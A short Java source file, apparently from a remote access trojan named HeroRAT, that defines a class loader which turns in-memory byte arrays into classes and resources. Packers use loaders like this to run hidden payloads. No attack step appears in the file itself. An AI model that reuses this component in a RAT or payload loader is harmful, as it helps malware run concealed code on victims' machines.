package net.herorat.loader;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.util.Map;

public class EncryptedClassLoader extends ClassLoader
{
	private final Map<String, byte[]> classes;
	private final Map<String, byte[]> resources;

	public EncryptedClassLoader(Map<String, byte[]> classes, Map<String, byte[]> resources)
	{
		this.classes = classes;
		this.resources = resources;
	}

	public Class<?> loadClass(String classToLoad) throws ClassNotFoundException
	{
		byte[] buffer = classes.remove(classToLoad);
		if (buffer != null)
		{
			return defineClass(classToLoad, buffer, 0, buffer.length, null);
		}

		return super.loadClass(classToLoad);
	}
	
	public InputStream getResourceAsStream(String name)
	{
		byte[] buffer = resources.get(name);
		return new ByteArrayInputStream(buffer);
	}
	
	public String toString()
	{
		return "HeroRAT Class Loader";
	}
}